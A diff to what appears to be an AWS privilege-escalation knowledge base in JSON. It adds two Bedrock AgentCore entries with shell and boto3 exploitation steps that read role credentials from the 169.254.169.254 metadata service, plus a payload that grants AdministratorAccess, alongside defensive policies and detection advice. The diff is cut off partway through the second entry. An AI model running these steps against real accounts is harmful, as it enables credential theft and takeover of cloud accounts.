@@ -1676,7 +1676,7 @@
       "sagemaker-001"
     ],
     "detectionTools": {
-      "prowler": "https://github.com/prowler-cloud/prowler/blob/eabe4884379070c72e07103f239bac70d31f6320/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L294",
+      "prowler": "https://github.com/prowler-cloud/prowler/blob/1e1c1c018b6466b416e8cc98a452b11d4b83ae07/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L300",
       "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/015f16030f35a40631560a895d5ae416f58b6a94/cloudsplaining/shared/constants.py#L183"
     },
     "learningEnvironments": {
@@ -1831,8 +1831,13 @@
     },
     "gitMetadata": {
       "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2026-05-31T01:08:20Z",
+      "lastUpdated": "2026-07-07T10:09:46Z",
       "contributors": [
+        {
+          "name": "MrCloudSec",
+          "email": "sgarcia@beyondtrust.com",
+          "githubUsername": "MrCloudSec"
+        },
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
@@ -1930,7 +1935,7 @@
       "ec2-002"
     ],
     "detectionTools": {
-      "prowler": "https://github.com/prowler-cloud/prowler/blob/eabe4884379070c72e07103f239bac70d31f6320/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L300",
+      "prowler": "https://github.com/prowler-cloud/prowler/blob/1e1c1c018b6466b416e8cc98a452b11d4b83ae07/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L307",
       "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/015f16030f35a40631560a895d5ae416f58b6a94/cloudsplaining/shared/constants.py#L163"
     },
     "permissions": {
@@ -2103,8 +2108,13 @@
     },
     "gitMetadata": {
       "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2026-05-31T01:08:20Z",
+      "lastUpdated": "2026-07-07T10:09:46Z",
       "contributors": [
+        {
+          "name": "MrCloudSec",
+          "email": "sgarcia@beyondtrust.com",
+          "githubUsername": "MrCloudSec"
+        },
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
@@ -2118,6 +2128,1319 @@
       ]
     },
     "filePath": "data/paths/bedrock/bedrock-002.yaml"
+  },
+  {
+    "id": "bedrock-003",
+    "name": "iam:PassRole + bedrock-agentcore:CreateAgentRuntime + bedrock-agentcore:CreateAgentRuntimeEndpoint + bedrock-agentcore:CreateWorkloadIdentity + bedrock-agentcore:InvokeAgentRuntimeCommand",
+    "category": "new-passrole",
+    "services": [
+      "iam",
+      "bedrock-agentcore"
+    ],
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:PassRole",
+          "resourceConstraints": "Target role ARN must be in the Resource section and the role must trust bedrock-agentcore.amazonaws.com"
+        },
+        {
+          "permission": "bedrock-agentcore:CreateAgentRuntime",
+          "resourceConstraints": "Must have permission to create Bedrock AgentCore runtimes"
+        },
+        {
+          "permission": "bedrock-agentcore:CreateAgentRuntimeEndpoint",
+          "resourceConstraints": "Must have permission to create the runtime endpoint used to invoke the runtime"
+        },
+        {
+          "permission": "bedrock-agentcore:CreateWorkloadIdentity",
+          "resourceConstraints": "Must have permission to create the workload identity the runtime requires at creation"
+        },
+        {
+          "permission": "bedrock-agentcore:InvokeAgentRuntimeCommand",
+          "resourceConstraints": "Must have permission to invoke commands on the created runtime"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam:ListRoles",
+          "resourceConstraints": "Helpful for discovering AgentCore execution roles available to pass"
+        },
+        {
+          "permission": "iam:GetRole",
+          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
+        },
+        {
+          "permission": "bedrock-agentcore:GetAgentRuntime",
+          "resourceConstraints": "Useful for confirming the new runtime reached a READY state before invoking it"
+        }
+      ]
+    },
+    "description": "A principal with `iam:PassRole`, `bedrock-agentcore:CreateAgentRuntime`, `bedrock-agentcore:CreateAgentRuntimeEndpoint`, `bedrock-agentcore:CreateWorkloadIdentity` and `bedrock-agentcore:InvokeAgentRuntimeCommand` can deploy a new AgentCore Runtime with a privileged IAM execution role and then run shell commands as root inside its Firecracker microVM. `InvokeAgentRuntimeCommand` executes a submitted command as root parallel to the customer agent process, bypassing the agent, model and guardrails entirely. The command reads the execution role temporary credentials from the MicroVM Metadata Service (MMDS) at 169.254.169.254, AgentCore's equivalent of EC2's IMDS, granting the attacker the full permissions of the chosen execution role. Creating the runtime rather than targeting an existing one lets the attacker pick exactly which role to escalate to.",
+    "prerequisites": {
+      "admin": [
+        "A role must exist that trusts bedrock-agentcore.amazonaws.com to assume it",
+        "The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)"
+      ],
+      "lateral": [
+        "A role must exist that trusts bedrock-agentcore.amazonaws.com to assume it"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "export AWS_REGION=[your region]\nexport EXECUTION_ROLE=arn:aws:iam::[account-id]:role/[role with admin privs that trusts bedrock-agentcore]\nexport CONTAINER_URI=[attacker-controlled ECR image URI]\nwhich jq\n",
+          "description": "Set up session variables and confirm jq is installed"
+        },
+        {
+          "step": 2,
+          "command": "CREATE_OUTPUT=$(aws bedrock-agentcore-control create-agent-runtime \\\n  --agent-runtime-name atk_runtime \\\n  --role-arn $EXECUTION_ROLE \\\n  --agent-runtime-artifact \"{\\\"containerConfiguration\\\":{\\\"containerUri\\\":\\\"$CONTAINER_URI\\\"}}\" \\\n  --network-configuration '{\"networkMode\":\"PUBLIC\"}')\nRUNTIME_ARN=$(echo $CREATE_OUTPUT | jq -r .agentRuntimeArn)\nRUNTIME_ID=$(echo $CREATE_OUTPUT | jq -r .agentRuntimeId)\n",
+          "description": "Create a runtime with the privileged execution role. The call provisions the DEFAULT runtime endpoint and the workload identity, which is why CreateAgentRuntimeEndpoint and CreateWorkloadIdentity are required"
+        },
+        {
+          "step": 3,
+          "command": "while true; do\n  STATUS=$(aws bedrock-agentcore-control get-agent-runtime \\\n    --agent-runtime-id $RUNTIME_ID \\\n    --query 'status' --output text)\n  echo \"Status: $STATUS\"\n  [ \"$STATUS\" = \"READY\" ] && break\n  sleep 15\ndone\n",
+          "description": "Poll bedrock-agentcore:GetAgentRuntime until the runtime reaches READY. The microVM takes time to provision, and InvokeAgentRuntimeCommand errors out if called before the runtime is READY"
+        },
+        {
+          "step": 4,
+          "command": "cat << 'EOF' > \"get_creds_from_runtime.py\"\nimport boto3, sys, uuid\nclient = boto3.client(\"bedrock-agentcore\", region_name=sys.argv[2])\n\ncommand = \"\"\"bash -c '\nTOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H \"X-aws-ec2-metadata-token-ttl-seconds: 60\")\nROLE_NAME=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/)\ncurl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME\n'\"\"\"\n\nresponse = client.invoke_agent_runtime_command(\n  agentRuntimeArn=sys.argv[1],\n  runtimeSessionId=str(uuid.uuid4()),\n  body={\"command\": command, \"timeout\": 30},\n)\nfor event in response[\"stream\"]:\n  chunk = event[\"chunk\"]\n  if \"contentDelta\" in chunk and \"stdout\" in chunk[\"contentDelta\"]:\n    print(chunk[\"contentDelta\"][\"stdout\"], end=\"\")\nEOF\n",
+          "description": "Create the python file that submits a root shell command. The command first requests an MMDS session token, then GETs the security-credentials path with no role name to discover the execution role's alias (the same two-step discovery pattern used against EC2 IMDS when the role name is unknown), then fetches the credentials for that discovered role name. boto3 is used directly because the AWS CLI does not expose an invoke-agent-runtime-command subcommand"
+        },
+        {
+          "step": 5,
+          "command": "CREDS=$(python3 get_creds_from_runtime.py $RUNTIME_ARN $AWS_REGION)\necho export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r \".AccessKeyId\")\necho export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r \".SecretAccessKey\")\necho export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r \".Token\")\n",
+          "description": "Run the python file using the $RUNTIME_ARN to discover the execution role name and extract its credentials"
+        },
+        {
+          "step": 6,
+          "command": "export AWS_ACCESS_KEY_ID=<AccessKeyId from step 5>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 5>\nexport AWS_SESSION_TOKEN=<Token from step 5>\naws sts get-caller-identity\n",
+          "description": "Use the stolen credentials to act as the runtime execution role"
+        }
+      ]
+    },
+    "recommendation": "High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful. The `bedrock-agentcore:InvokeAgentRuntimeCommand` permission then runs arbitrary commands as root inside the runtime microVM, bypassing the agent, model and guardrails.\n\n- **Avoid administrative service roles** - Very rarely does an AgentCore Runtime need administrative access. Use the principle of least privilege and start from AWS's documented runtime execution role policy.\n- **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.\n- **Constrain `bedrock-agentcore:InvokeAgentRuntimeCommand`** - Treat it as a command-execution gate equivalent to root on the microVM and deny it org-wide except for an approved allowlist.\n\nUse IAM policy conditions to restrict which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificAgentCoreRuntimeRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"bedrock-agentcore.amazonaws.com\"\n    }\n  }\n}\n```\n\nDeny the command-execution permission outside an approved allowlist with an SCP:\n\n```json\n{\n  \"Effect\": \"Deny\",\n  \"Action\": \"bedrock-agentcore:InvokeAgentRuntimeCommand\",\n  \"Resource\": \"*\",\n  \"Condition\": {\n    \"ArnNotLike\": {\n      \"aws:PrincipalArn\": \"arn:aws:iam::*:role/ApprovedAgentCoreOperators\"\n    }\n  }\n}\n```\n\n- Enable CloudTrail data events for the `AWS::BedrockAgentCore::Runtime` and `RuntimeEndpoint` resource types to capture `InvokeAgentRuntimeCommand`\n- The auto-created `/aws/bedrock-agentcore/runtimes/<runtimeId>-DEFAULT` CloudWatch log group records the body of every submitted command; alert on entries that touch 169.254.169.254 or security-credentials\n- Monitor CloudTrail for runtime creation followed by immediate invocation, and for runtimes created by principals who do not usually deploy AgentCore\n- Monitor CloudTrail for roles being passed to bedrock-agentcore that have not been passed before\n- Regularly audit all IAM roles that trust bedrock-agentcore.amazonaws.com and down-scope any with administrative access\n",
+    "limitations": "This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks or access to sensitive data.\n",
+    "discoveryAttribution": {
+      "firstDocumented": {
+        "author": "Sergio Garcia",
+        "organization": "BeyondTrust Phantom Labs",
+        "date": 2026,
+        "link": "https://www.beyondtrust.com/blog/entry/aws-agentcore-privilege-escalation"
+      }
+    },
+    "references": [
+      {
+        "title": "Mapping Every Privilege Escalation Path in AWS AgentCore",
+        "url": "https://www.beyondtrust.com/blog/entry/aws-agentcore-privilege-escalation"
+      },
+      {
+        "title": "Understanding Credentials Management in Amazon Bedrock AgentCore",
+        "url": "https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/security-credentials-management.html"
+      },
+      {
+        "title": "AgentCore Runtime execution role permissions",
+        "url": "https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/runtime-permissions.html"
+      }
+    ],
+    "relatedPaths": [
+      "bedrock-001",
+      "bedrock-004",
+      "bedrock-005",
+      "ec2-001",
+      "sagemaker-001"
+    ],
+    "detectionTools": {
+      "prowler": "https://github.com/prowler-cloud/prowler/blob/1e1c1c018b6466b416e8cc98a452b11d4b83ae07/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L317"
+    },
+    "learningEnvironments": {
+      "pathfinding-labs": {
+        "type": "open-source",
+        "githubLink": "https://github.com/DataDog/pathfinding-labs",
+        "scenario": "privesc-one-hop/to-admin/iam-passrole+bedrockagentcore-createagentruntime",
+        "description": "Deploy Terraform into your own AWS account to practice this attack path"
+      }
+    },
+    "attackVisualization": {
+      "nodes": [
+        {
+          "id": "start",
+          "label": "Starting Principal",
+          "type": "principal",
+          "description": "The principal with iam:PassRole and the bedrock-agentcore create and invoke permissions. Can be an IAM user or role. This is the attacker's initial access point."
+        },
+        {
+          "id": "agent_runtime",
+          "label": "New AgentCore Runtime",
+          "type": "resource",
+          "description": "A new AgentCore Runtime created with a privileged execution role. The runtime runs on a Firecracker microVM that exposes the role credentials on the MicroVM Metadata Service (MMDS) at 169.254.169.254, AgentCore's equivalent of EC2's IMDS."
+        },
+        {
+          "id": "target_role",
+          "label": "Existing Role That Trusts the bedrock-agentcore Service",
+          "type": "principal",
+          "description": "The IAM role passed to the runtime as its execution role. The role must trust bedrock-agentcore.amazonaws.com to assume it. AgentCore assumes the role and serves its temporary credentials on MMDS at the execution_role endpoint inside the microVM."
+        },
+        {
+          "id": "method_sdk_attack",
+          "label": "Method 1: Act directly from the root shell",
+          "type": "payload",
+          "color": "#99ccff",
+          "description": "The submitted command runs as root inside the microVM where the execution role credentials are already present in the environment, so the attacker can perform privileged actions in place without exfiltrating anything.\n\nExample command body invoked through InvokeAgentRuntimeCommand:\n```bash\naws iam attach-user-policy \\\n  --user-name attacker-user \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n```\n"
+        },
+        {
+          "id": "method_cred_exfil",
+          "label": "Method 2: Exfiltrate credentials to the response stream",
+          "type": "payload",
+          "color": "#99ccff",
+          "description": "The submitted command reads the execution role credentials from MMDS and prints them, and AgentCore returns the output in the response stream so the attacker can use the credentials from any location. Since the execution role's alias is not known in advance, the command first requests a session token, then GETs the security-credentials path with no role name to discover the role, then fetches the credentials for that discovered name -- the same two-step discovery pattern used against EC2 IMDS.\n\nExample command body invoked through InvokeAgentRuntimeCommand:\n```bash\nTOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H \"X-aws-ec2-metadata-token-ttl-seconds: 60\")\nROLE_NAME=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/)\ncurl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME\n```\n\nThis returns AccessKeyId, SecretAccessKey and Token, which the attacker can export and use until they expire. The command must be submitted through boto3's invoke_agent_runtime_command -- the AWS CLI does not expose an equivalent subcommand -- and only succeeds once the runtime has reached READY (confirmed via bedrock-agentcore:GetAgentRuntime).\n"
+        },
+        {
+          "id": "admin",
+          "label": "Effective Administrator",
+          "type": "outcome",
+          "description": "The execution role has AdministratorAccess or equivalent permissions, so acting as the role or using its exfiltrated credentials gives the attacker full administrative access to the AWS account."
+        },
+        {
+          "id": "some_perms",
+          "label": "Some additional access",
+          "type": "outcome",
+          "color": "#ffeb99",
+          "description": "The execution role has some elevated permissions but not full admin. This could provide data access (S3, RDS, DynamoDB) or enable additional privilege escalation paths. The attacker should enumerate the role permissions to determine what was gained."
+        },
+        {
+          "id": "no_access",
+          "label": "No additional access",
+          "type": "outcome",
+          "color": "#cccccc",
+          "description": "The execution role only has minimal permissions (e.g., logs:PutLogEvents). Limited usefulness for privilege escalation, and the attacker would target a different role."
+        }
+      ],
+      "edges": [
+        {
+          "from": "start",
+          "to": "agent_runtime",
+          "label": "iam:PassRole + bedrock-agentcore:CreateAgentRuntime",
+          "description": "Create a new AgentCore Runtime and pass the target role to it as the execution role. The runtime runs on a Firecracker microVM with access to MMDS.\n\nCommand:\n```bash\naws bedrock-agentcore-control create-agent-runtime \\\n  --agent-runtime-name atk_runtime \\\n  --role-arn $EXECUTION_ROLE \\\n  --agent-runtime-artifact '{\"containerConfiguration\":{\"containerUri\":\"<attacker-ecr-uri>\"}}' \\\n  --network-configuration '{\"networkMode\":\"PUBLIC\"}'\n```\n"
+        },
+        {
+          "from": "agent_runtime",
+          "to": "target_role",
+          "label": "Runtime assumes the execution role",
+          "description": "AgentCore assumes the passed execution role and serves its temporary credentials on the MicroVM Metadata Service at http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name> inside the runtime microVM. The role name is not known in advance, so it must be discovered with a GET to the security-credentials path first. The runtime must also reach a READY state, pollable with bedrock-agentcore:GetAgentRuntime, before MMDS reliably serves credentials and before InvokeAgentRuntimeCommand will succeed."
+        },
+        {
+          "from": "target_role",
+          "to": "method_sdk_attack",
+          "label": "Option A",
+          "branch": "A",
+          "description": "The attacker submits a command that uses the role credentials in place from the root shell to perform privileged actions directly."
+        },
+        {
+          "from": "target_role",
+          "to": "method_cred_exfil",
+          "label": "Option B",
+          "branch": "B",
+          "description": "The attacker submits a command that reads the role credentials from MMDS and returns them in the response stream for use from any location."
+        },
+        {
+          "from": "method_sdk_attack",
+          "to": "admin",
+          "label": "If the execution role has admin permissions",
+          "branch": "A1",
+          "condition": "admin",
+          "description": "If the execution role has AdministratorAccess or equivalent, the in-place command grants the starting principal full administrative access, for example by attaching admin policies or creating admin access keys."
+        },
+        {
+          "from": "method_sdk_attack",
+          "to": "some_perms",
+          "label": "If the execution role has some elevated permissions",
+          "branch": "A2",
+          "condition": "some_permissions",
+          "description": "If the execution role has some elevated permissions, the in-place command can still grant useful additional access within the role permission scope or reach sensitive resources."
+        },
+        {
+          "from": "method_sdk_attack",
+          "to": "no_access",
+          "label": "If the execution role has minimal permissions",
+          "branch": "A3",
+          "condition": "no_permissions",
+          "description": "If the execution role only has minimal permissions, the in-place command cannot perform meaningful privilege escalation and the attacker would pass a different role."
+        },
+        {
+          "from": "method_cred_exfil",
+          "to": "admin",
+          "label": "If the execution role has admin permissions",
+          "branch": "B1",
+          "condition": "admin",
+          "description": "If the execution role has AdministratorAccess or equivalent, the exfiltrated credentials give the attacker full administrative access to the AWS account from any location."
+        },
+        {
+          "from": "method_cred_exfil",
+          "to": "some_perms",
+          "label": "If the execution role has some elevated permissions",
+          "branch": "B2",
+          "condition": "some_permissions",
+          "description": "If the execution role has some elevated permissions, the exfiltrated credentials can be used for lateral movement or additional attacks."
+        },
+        {
+          "from": "method_cred_exfil",
+          "to": "no_access",
+          "label": "If the execution role has minimal permissions",
+          "branch": "B3",
+          "condition": "no_permissions",
+          "description": "If the execution role only has minimal permissions, the exfiltrated credentials provide limited value for privilege escalation."
+        }
+      ]
+    },
+    "gitMetadata": {
+      "created": "2026-06-15T19:04:36Z",
+      "lastUpdated": "2026-08-24T13:22:24Z",
+      "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
+        {
+          "name": "MrCloudSec",
+          "email": "sgarcia@beyondtrust.com",
+          "githubUsername": "MrCloudSec"
+        }
+      ]
+    },
+    "filePath": "data/paths/bedrock/bedrock-003.yaml"
+  },
+  {
+    "id": "bedrock-004",
+    "name": "bedrock-agentcore:InvokeAgentRuntimeCommand",
+    "category": "existing-passrole",
+    "services": [
+      "bedrock-agentcore"
+    ],
+    "description": "A principal with `bedrock-agentcore:InvokeAgentRuntimeCommand` can run a shell command as root inside the Firecracker microVM of an existing AgentCore Runtime or Harness, parallel to the customer agent process and bypassing the agent, model and guardrails entirely. The command reads the execution role temporary credentials from the MicroVM Metadata Service (MMDS) at 169.254.169.254, AgentCore's equivalent of EC2's IMDS, granting the attacker the full permissions of the role already attached to that resource. This path does not require `iam:PassRole` because the role is already attached to the existing resource. Harness is AgentCore Runtime with a managed agent layer on top, so the same single permission applies to both resource types. Only resources using IAM as their Inbound Auth type are affected; resources configured to use JSON Web Tokens (JWT) reject the call.",
+    "prerequisites": {
+      "admin": [
+        "An AgentCore Runtime or Harness must exist with an IAM execution role attached",
+        "The resource must use IAM as its Inbound Auth type (resources configured to use JWT reject InvokeAgentRuntimeCommand)",
+        "The execution role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)"
+      ],
+      "lateral": [
+        "An AgentCore Runtime or Harness must exist with an IAM execution role attached",
+        "The resource must use IAM as its Inbound Auth type"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws bedrock-agentcore-control list-agent-runtimes\naws bedrock-agentcore-control list-harnesses\n",
+          "description": "List existing runtimes and harnesses to find targets with privileged execution roles"
+        },
+        {
+          "step": 2,
+          "command": "aws bedrock-agentcore-control get-agent-runtime --agent-runtime-id RUNTIME_ID",
+          "description": "Check the resource's execution role ARN to confirm elevated permissions, and note the runtime or harness ARN to target"
+        },
+        {
+          "step": 3,
+          "command": "cat << 'EOF' > \"get_creds_from_runtime.py\"\nimport boto3, sys, uuid\nclient = boto3.client(\"bedrock-agentcore\", region_name=sys.argv[2])\n\ncommand = \"\"\"bash -c '\nTOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H \"X-aws-ec2-metadata-token-ttl-seconds: 60\")\nROLE_NAME=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/)\ncurl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME\n'\"\"\"\n\n# sys.argv[1] is the existing runtime ARN or harness ARN\nresponse = client.invoke_agent_runtime_command(\n  agentRuntimeArn=sys.argv[1],\n  runtimeSessionId=str(uuid.uuid4()),\n  body={\"command\": command, \"timeout\": 30},\n)\nfor event in response[\"stream\"]:\n  chunk = event[\"chunk\"]\n  if \"contentDelta\" in chunk and \"stdout\" in chunk[\"contentDelta\"]:\n    print(chunk[\"contentDelta\"][\"stdout\"], end=\"\")\nEOF\n",
+          "description": "Create the python file that submits a root shell command reading the execution role credentials from MMDS on the existing resource. The attacker rarely knows the execution role's alias in advance, so the command first queries the security-credentials path with no name to discover it, then fetches the credential document at the role-specific path, mirroring the EC2 IMDS credential-discovery pattern"
+        },
+        {
+          "step": 4,
+          "command": "CREDS=$(python3 get_creds_from_runtime.py $TARGET_ARN $AWS_REGION)\necho export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r \".AccessKeyId\")\necho export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r \".SecretAccessKey\")\necho export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r \".Token\")\n",
+          "description": "Run the python file against the existing runtime or harness ARN to extract the execution role credentials"
+        },
+        {
+          "step": 5,
+          "command": "export AWS_ACCESS_KEY_ID=<AccessKeyId from step 4>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 4>\nexport AWS_SESSION_TOKEN=<Token from step 4>\naws sts get-caller-identity\n",
+          "description": "Use the stolen credentials to act as the resource execution role"
+        }
+      ]
+    },
+    "recommendation": "Restrict `bedrock-agentcore:InvokeAgentRuntimeCommand` using resource-level constraints, and treat it as a command-execution gate equivalent to root on the runtime microVM.\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"bedrock-agentcore:InvokeAgentRuntimeCommand\",\n  \"Resource\": \"arn:aws:bedrock-agentcore:REGION:ACCOUNT_ID:runtime/SpecificRuntime\"\n}\n```\n\nIn AWS Organizations, deny the permission org-wide except for an approved allowlist with an SCP:\n\n```json\n{\n  \"Effect\": \"Deny\",\n  \"Action\": \"bedrock-agentcore:InvokeAgentRuntimeCommand\",\n  \"Resource\": \"*\",\n  \"Condition\": {\n    \"ArnNotLike\": {\n      \"aws:PrincipalArn\": \"arn:aws:iam::*:role/ApprovedAgentCoreOperators\"\n    }\n  }\n}\n```\n\nAdditional controls:\n- Any policy granting the `bedrock-agentcore:*` wildcard includes this permission, including the AWS managed BedrockAgentCoreFullAccess policy; audit principals that hold it\n- Enable CloudTrail data events for the `AWS::BedrockAgentCore::Runtime` and `RuntimeEndpoint` resource types (Harness manages a Runtime under the hood, so both are covered by these types)\n- The auto-created `/aws/bedrock-agentcore/runtimes/<runtimeId>-DEFAULT` CloudWatch log group records the body of every submitted command; alert on entries that touch 169.254.169.254 or security-credentials\n- Scope every AgentCore execution role to least privilege so a stolen role steals nothing it could not already do\n- Regularly audit execution roles attached to existing runtimes and harnesses, including the Console-provisioned default service roles\n",
+    "limitations": "This path provides administrative access only if the target resource execution role has administrative permissions. The attacker gains whatever permissions the resource role has. If the role has limited permissions, the attacker gains limited access. However, even limited access may enable multi-hop attacks or access to sensitive data.\n",
+    "discoveryAttribution": {
+      "firstDocumented": {
+        "author": "Sergio Garcia",
+        "organization": "BeyondTrust Phantom Labs",
+        "date": 2026,
+        "link": "https://www.beyondtrust.com/blog/entry/aws-agentcore-privilege-escalation"
+      },
+      "derivativeOf": {
+        "pathId": "bedrock-003",
+        "modification": "Targets an existing Runtime or Harness instead of creating one, eliminating the need for iam:PassRole and the bedrock-agentcore Create permissions; the single InvokeAgentRuntimeCommand permission covers both resource types because Harness manages a Runtime under the hood"
+      }
+    },
+    "references": [
+      {
+        "title": "Mapping Every Privilege Escalation Path in AWS AgentCore",
+        "url": "https://www.beyondtrust.com/blog/entry/aws-agentcore-privilege-escalation"
+      },
+      {
+        "title": "Understanding Credentials Management in Amazon Bedrock AgentCore",
+        "url": "https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/security-credentials-management.html"
+      },
+      {
+        "title": "AgentCore Harness Environment and Skills",
+        "url": "https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/harness-environment.html"
+      },
+      {
+        "title": "AgentCore Runtime command execution security best practices",
+        "url": "https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/runtime-security-best-practices.html"
+      }
+    ],
+    "relatedPaths": [
+      "bedrock-002",
+      "bedrock-003",
+      "bedrock-005",
+      "ec2-002",
+      "lambda-003"
+    ],
+    "learningEnvironments": {
+      "pathfinding-labs": {
+        "type": "open-source",
+        "githubLink": "https://github.com/DataDog/pathfinding-labs",
+        "scenario": "privesc-one-hop/to-admin/bedrockagentcore-invokeagentcommand",
+        "description": "Deploy Terraform into your own AWS account to practice this attack path"
+      }
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "bedrock-agentcore:InvokeAgentRuntimeCommand",
+          "resourceConstraints": "Target runtime or harness must be in the Resource section and must use IAM as its Inbound Auth type"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "bedrock-agentcore:ListAgentRuntimes",
+          "resourceConstraints": "List the runtimes that already exist"
+        },
+        {
+          "permission": "bedrock-agentcore:GetAgentRuntime",
+          "resourceConstraints": "Identify the execution role and Inbound Auth type of a target resource"
+        }
+      ]
+    },
+    "detectionTools": {
+      "prowler": "https://github.com/prowler-cloud/prowler/blob/1e1c1c018b6466b416e8cc98a452b11d4b83ae07/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L314"
+    },
+    "attackVisualization": {
+      "nodes": [
+        {
+          "id": "start",
+          "label": "Starting Principal",
+          "type": "principal",
+          "description": "The principal with bedrock-agentcore:InvokeAgentRuntimeCommand. Can be an IAM user or role. This attack targets an existing runtime or harness rather than creating one, so iam:PassRole is not required."
+        },
+        {
+          "id": "agent_resource",
+          "label": "Existing Runtime or Harness",
+          "type": "resource",
+          "description": "An existing AgentCore Runtime or Harness with a privileged execution role already attached, using IAM as its Inbound Auth type. The resource runs on a Firecracker microVM with access to the MicroVM Metadata Service (MMDS) at 169.254.169.254, AgentCore's equivalent of EC2's IMDS."
+        },
+        {
+          "id": "execution_role",
+          "label": "Resource Execution Role",
+          "type": "principal",
+          "description": "The IAM role attached to the runtime or harness as its execution role. A command submitted through InvokeAgentRuntimeCommand runs as root in the microVM with this role's credentials available on MMDS at the execution_role endpoint. This role must trust bedrock-agentcore.amazonaws.com in its trust policy."
+        },
+        {
+          "id": "method_sdk_attack",
+          "label": "Method 1: Act directly from the root shell",
+          "type": "payload",
+          "color": "#99ccff",
+          "description": "The submitted command runs as root inside the microVM where the execution role credentials are already present, so the attacker can perform privileged actions in place without exfiltrating anything.\n\nExample command body invoked through InvokeAgentRuntimeCommand:\n```bash\naws iam attach-user-policy \\\n  --user-name attacker-user \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n```\n"
+        },
+        {
+          "id": "method_cred_exfil",
+          "label": "Method 2: Exfiltrate credentials to the response stream",
+          "type": "payload",
+          "color": "#99ccff",
+          "description": "The submitted command reads the execution role credentials from MMDS and prints them, and AgentCore returns the output in the response stream so the attacker can use the credentials from any location. Since the attacker typically does not know the execution role's alias in advance, the command first queries the security-credentials path with no name to discover it, then fetches the full credential document at the role-specific path, the same two-step pattern used to exfiltrate credentials from EC2's IMDS.\n\nExample command body invoked through InvokeAgentRuntimeCommand:\n```bash\nTOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H \"X-aws-ec2-metadata-token-ttl-seconds: 60\")\nROLE_NAME=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/)\ncurl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME\n```\n\nThis returns AccessKeyId, SecretAccessKey and Token, which the attacker can export and use until they expire.\n"
+        },
+        {
+          "id": "admin",
+          "label": "Effective Administrator",
+          "type": "outcome",
+          "description": "The resource execution role has AdministratorAccess or equivalent permissions, so acting as the role or using its exfiltrated credentials gives the attacker full administrative access to the AWS account."
+        },
+        {
+          "id": "some_perms",
+          "label": "Some additional access",
+          "type": "outcome",
+          "color": "#ffeb99",
+          "description": "The execution role has some elevated permissions but not full admin. This could provide data access (S3, RDS, DynamoDB) or enable additional privilege escalation paths. The attacker should enumerate the role permissions to determine what was gained."
+        },
+        {
+          "id": "no_access",
+          "label": "No additional access",
+          "type": "outcome",
+          "color": "#cccccc",
